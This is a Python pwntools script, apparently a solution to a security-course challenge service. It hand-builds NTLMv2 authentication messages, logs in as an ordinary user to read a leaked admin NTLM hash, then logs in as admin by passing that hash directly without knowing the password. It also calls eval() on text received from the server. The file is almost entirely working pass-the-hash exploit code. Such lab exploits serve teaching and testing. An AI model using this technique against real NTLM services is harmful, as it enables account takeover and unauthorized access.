from pwn import *
from Crypto.Hash import MD4
from Crypto.Cipher import DES
import binascii
import time
import hmac


FLAG_UNICODE	= 0x00000001
FLAG_TARGET		= 0x00000004
FLAG_NTLMV2		= 0x00080000


def register(r, account, password):
	txt = r.recvuntil('option >> ')
	r.sendline('1')
	txt = r.recvuntil('Account: ')	
	r.sendline(account)
	r.recvuntil('Password: ')
	r.sendline(password)

def sendtype1(r, account):
	txt = r.recvuntil('option >> ')
	r.sendline('2')
	txt = r.recvuntil('Account: ')
	r.sendline(account)
	type1 = bytearray(b'')
	
	# NTLMSSP Signature	
	NTLMsign = ('NTLMSSP\0').encode()
	# NTLMSSP Message Type
	msgtype = (1).to_bytes(4, 'little')
	# Flags	
	flag = FLAG_UNICODE | FLAG_NTLMV2 | FLAG_TARGET
	flag = flag.to_bytes(4, 'little')
	type1 = NTLMsign + msgtype + flag
	r.sendline(type1)

def recvtype2(r):
	rsp = r.recvline(keepends = False)
	pos = 0
	# NTLMSSP Signature	
	pos += 8
	# NTLMSSP Message Type
	pos += 4
	# Target Name
	tg_name_len = int.from_bytes(rsp[pos : pos + 2], 'little')
	tg_name_space = int.from_bytes(rsp[pos + 2 : pos + 4], 'little')
	tg_name_offset = int.from_bytes(rsp[pos + 4 : pos + 8], 'little')
	pos += 8 
	# Flags
	pos += 4
	# Challenge
	challenge = rsp[pos : pos + 8]
	pos += 8
	# Context
	pos += 8
	# Target Information
	tg_info_len = int.from_bytes(rsp[pos : pos + 2], 'little')
	tg_info_space = int.from_bytes(rsp[pos + 2 : pos + 4], 'little')
	tg_info_offset = int.from_bytes(rsp[pos + 4 : pos + 8], 'little')
	pos += 8
	# OS Version
	pos += 8
	# Target Name Data
	tg_name_data = rsp[pos : pos + tg_name_len]
	pos += tg_name_len
	# Target Information Data
	tg_info_data = rsp[pos : pos + tg_info_len]	
	return challenge, tg_name_data, tg_info_data

def NTLMv2_blob(tg_info_data, nonce):
	blob = bytearray(b'')
	# Blob Signature
	blob += (0x00000101).to_bytes(4, 'little')
	# Reserved
	blob += (0x00000000).to_bytes(4, 'little')
	# Timestamp
	seconds = (int(time.time()) + 11644473600) * (10 ** 7)
	blob  += seconds.to_bytes(8, 'little')
	# Client Nonce
	blob += (0x1234567890123456).to_bytes(8, 'little')
	# Unknown
	blob += (0x00000000).to_bytes(4, 'little')
	# Target Information
	blob += tg_info_data
	# Unknown
	blob += (0x00000000).to_bytes(4, 'little')
	return blob

def fill_in_security_buffer(type3, data_pos, data):
	type3 += (len(data)).to_bytes(2, 'little')
	type3 += (len(data)).to_bytes(2, 'little')
	type3 += (data_pos).to_bytes(4, 'little')
	data_pos += len(data)
	return type3, data_pos

def sendtype3(r, challenge, tg_name_data, tg_info_data, account, password, isadmin):
	# NTLM hash
	if isadmin:
		NTLMhash = password
	else:
		md4 = MD4.new()
		md4.update(password.encode())
		NTLMhash = md4.digest()
	#print('NTLM hash', NTLMhash)
	# NTLMv2 hash
	NTLMv2hash = hmac.new(NTLMhash, account.upper().encode() + tg_name_data, 'md5').digest()
	#print('NTLMv2 hash', NTLMv2hash)
	
	# Nonce
	nonce = (0x1234567890123456).to_bytes(8, 'little')

	blob = NTLMv2_blob(tg_info_data, nonce)
	NTLMv2_data = hmac.new(NTLMv2hash, challenge + blob, 'md5').digest() + blob 
	LMv2_data = hmac.new(NTLMv2hash, challenge + nonce, 'md5').digest() + nonce

	type3 = bytearray(b'')
	data_block_pos = 72
	# NTLMSSP Signature
	type3 += ('NTLMSSP\0').encode()
	# NTLM Message Type
	type3 += (3).to_bytes(4, 'little')
	# LMv2 Security Buffer
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, LMv2_data)
	# NTLMv2 Security Buffer
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, NTLMv2_data)
	# Target Name Security Buffer
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, tg_name_data)
	# User Name Security Buffer 
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, account.encode())
	# Workstation Name Security Buffer
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, account.encode())
	# Session Key Security Buffer
	type3, data_block_pos = fill_in_security_buffer(type3, data_block_pos, b'')
	# Flags
	flag = FLAG_UNICODE | FLAG_NTLMV2 | FLAG_TARGET
	type3 += flag.to_bytes(4, 'little')
	# OS Version
	type3 += (0x0f000000ffffffff).to_bytes(8, 'little')
	# Data
	#print('LMv2:', LMv2_data)
	#print('NTLMv2:', NTLMv2_data)
	type3 += LMv2_data + NTLMv2_data + tg_name_data + account.encode() + account.encode() 
	r.sendline(type3)

	if isadmin:
		txt = r.recvline(keepends = False)
		print(txt.decode())
		return	
	else:
		# Hi user
		txt = r.recvline(keepends = False)
		# admin&user hash	
		txt = r.recvline(keepends = False)
		total_hash = eval(txt.decode())
		return total_hash['admin'.encode()]



def main():
	account = 'aaa'
	password = 'bbb'
	admin = 'admin'
	r = remote('cns.csie.org', '30005')
	register(r, account, password)

	# login as normal user	
	sendtype1(r, account)
	challenge, tg_name_data, tg_info_data = recvtype2(r)
	admin_hash = sendtype3(r, challenge, tg_name_data, tg_info_data, account, password, False)
	

	# login as admin
	sendtype1(r, admin)
	challenge, tg_name_data, tg_info_data = recvtype2(r)
	sendtype3(r, challenge, tg_name_data, tg_info_data, admin, admin_hash['ntlm'.encode()], True)




if __name__ == '__main__':
	main()
